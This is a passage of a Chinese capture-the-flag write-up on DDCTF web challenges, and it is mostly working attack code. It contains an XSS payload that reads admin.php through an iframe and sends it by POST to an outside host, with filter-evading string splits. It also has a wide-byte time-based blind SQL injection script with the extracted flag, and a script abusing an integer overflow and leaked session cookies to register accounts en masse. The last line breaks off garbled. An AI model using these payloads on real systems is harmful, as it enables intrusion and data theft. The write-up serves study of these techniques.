    function s(e) {
      var t = new XMLHttpRequest;
      t.open("POST", "//eval:2017", !0),
      t.setRequestHeader("Content-type", "text/plain"),
      t.onreadystatechange = function() {
        4 == t.readyState && t.status
      },
      t.send(e);
    };
    var a = document.createElement("ifr"+"ame");
    a.src = "./admin.php";
    document.body.appendChild(a);
    a.onload = function (){
      var c = document.getElementsByTagName("ifr"+"ame")[0]["contentWin"+"dow"].document.getElementsByTagName("body")[0].innerHTML;
      s("5am3: "+c);
    };
    a.onerror = function (){
        s("5am3 error!");
    };
这里还有一个坑点是，渲染payload是在admin.php，此时如果读当前页面源码，返回的是你的payload。必须再次通过iframe读取admin.php，才能获取到本来的源码。
从源码中，可以得到一个接口：
    http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=
这就是传说中的注入点！！！要不是主办方肯定他是，我都不敢信...
最后终于通过宽字节注入，试出了点眉目。
p.s.注入过程真心迷，不跑5遍以上脚本，读不出来正确的东西
    import requests
    url = "http://117.51.147.2/Ze02pQYLf5gGNyMn//query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id={payload}"
    sdb ="SELECT database()"
    sdbt = "database()"
    sschema = "SELECT group_concat(schema_name) from information_schema.SCHEMATA"
    stable = "SELECT group_concat(table_name) from information_schema.tables where table_schema=CHAR(99,116,102,100,98)"
    scolumn = "SELECT group_concat(column_name) from information_schema.columns where table_name=CHAR(99,116,102,95,102,104,109,72,82,80,76,53)"
    sflag = "SELECT group_concat(ctf_value) from ctfdb.ctf_fhmHRPL5"
    script = sflag
    charIndex = 1
    p1 = "1%df%27 || if(ascii(substr(("+script+"),{charIndex},1))={i},sleep(100),5)%23"
    plendatabase = "1%df%27 || if(length(database())={i},sleep(100),5)%23"
    ptest = "1%df%27 || sleep(5)%23"
    # len(database) = 3
    # database() = say
    # schema = information_schema,ctfdb,say
    # table = ctf_fhmHRPL5
    # colum = ctf_value
    # DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}
    string = "qwertyuiopasdfghjklzxcvbnm"
    str1=""
    slist = range(33,97)
    slist += range(123,127)
    flag=""
    onpayload = p1
    # print slist
    for j in range(1,50):
        for i in range(32,127):
            try:
                # i = str(hex(i))
                i = str(i)
                payload = onpayload.replace("{i}",i).replace("{charIndex}",str(j))  
                r = requests.get(url+payload,timeout=3)
                text = r.text.replace("\n","")
                text = text.replace("\r","")
                text = text.replace("\t","")
                # print("["+str(i)+"]" + payload)
                # print("[text] " + text[:10])
            except:
                flag+=chr(int(i))
                print(flag)
                break
### [210pt] 大吉大利，今晚吃鸡
很迷很尬的一道题，最后小手段才做出来。
首先，很容易可以看出来，是一个go写的。
而且买票时，票价只可以多 ，不可以少。此时可以猜到是溢出，从而实现购买。
可以看一下，go中的数字范围。然后天真的从大往小试。最终卡在了以下俩数。
    9223372036854775807   // 可以输入，显示正常
    9223372036854775808   // 报500，无法输入
于是自己天真的认为 ，题目对溢出做了判断，然后就凉了。蜜汁分析了半天。
最后再注册处发现一个越权漏洞。每次注册，无论成功与否，都会返回注册用户的cookie，此时可以直接登录。
于是看了一下榜单，挨个试了一下榜单师傅们的id。
最后还真找到了rmb122师傅的账号，然后发现他用的4294967296溢出。也就是uint32
心态炸了。竟然不是uint64，自己也没试uint32。哭了。
此时通过溢出，可以直接购票。然后我们进入下一关，如何删除竞争对手。一说到游戏，顿时想起了“白导”。我自己也导演一场呗。
于是，新建账号 -> 买票 -> 付款 -> 加入游戏 -> 获取id踢掉。一条龙服务。脚本如下：
    import requests
    import random
    import time
    tmpID = "1"
    tmpSession = requests.session()
    registerURL = "http://117.51.147.155:5050/ctf/api/register?name=5am3_t1{name}&password=12345678aa90"
    buyTicketURL = "http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296"
    payTicketURL = "http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id={bill}"
    removeRobotsURL = "http://117.51.147.155:5050/ctf/api/remove_robot?id={uid}&ticket={ticket}"
    headers = {
        "Cookie": "REVEL_SESSION=367aac22fa4d096ee5e45e5e214071cf; user_name=5am3"
    }
    def getTicket(tmpID):
        tmpRegisterURL = registerURL.replace("{name}",tmpID)
        tmpSession.get(tmpRegisterURL)
        billID = tmpSession.get(buyTicketURL).json()["data"][0]["bill_id"]
        # print(billID)
        tmpPayTicketURL = payTicketURL.replace("{bill}",billID)
        # print(tmpPayTicketURL)
        ticketJson = tmpSession.get(tmpPayTicketURL).json()
        # print(ticketJson)
        ticket,uid = ticketJson["data"][0].values()
        return ticket,uid
    if __name__ == '__main__':
        i = 1
        c = 0
        while(i /home/dc2-user/ctf_web_2/didi_ctf_web2.py